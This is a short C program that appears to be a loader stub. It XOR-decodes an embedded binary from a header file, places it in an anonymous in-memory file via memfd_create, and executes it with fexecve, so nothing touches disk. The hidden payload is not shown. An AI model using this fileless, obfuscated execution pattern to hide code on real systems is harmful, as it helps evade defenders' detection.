#include <sys/syscall.h>
#include <linux/memfd.h>
#include <unistd.h>
#include <err.h>

#include "enc_bin.h"

int main(int argc, char **argv) {
    int fd;
    if ((fd = syscall(SYS_memfd_create, "bin", 0)) == -1)
        err(1, "Can't unpack");
    for (unsigned int i = 0; i < binary_len; i++)
        binary[i] ^= 22;

    write(fd, binary, binary_len);
    if (fexecve(fd, argv, (char*[]){NULL}) == -1)
        err(1, "Can't execute");
}
